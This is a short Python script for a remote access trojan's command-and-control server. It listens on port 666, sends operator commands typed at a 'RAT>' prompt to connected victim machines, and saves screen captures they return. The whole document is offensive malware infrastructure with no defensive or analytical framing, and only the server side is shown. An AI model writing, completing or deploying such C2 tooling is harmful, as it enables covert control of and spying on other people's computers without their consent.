import socket  
import threading  

class C2Server:  
    def __init__(self, host='0.0.0.0', port=666):  
        self.host = host  
        self.port = port  
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
        self.sock.bind((self.host, self.port))  
        self.sock.listen(5)  

    def handle_client(self, client):  
        try:  
            while True:  
                cmd = input("RAT> ")  
                client.send(cmd.encode())  
                if cmd == "screen_capture":  
                    data = client.recv(1024)  
                    with open("screen.png", "wb") as f:  
                        f.write(data)  
                elif cmd == "exit":  
                    client.close()  
                    break  
        except:  
            client.close()  

    def start(self):  
        print(f"[+] C2 Active: {self.host}:{self.port}")  
        while True:  
            client, addr = self.sock.accept()  
            threading.Thread(target=self.handle_client, args=(client,)).start()  

if __name__ == "__main__":  
    server = C2Server()  
    server.start()  
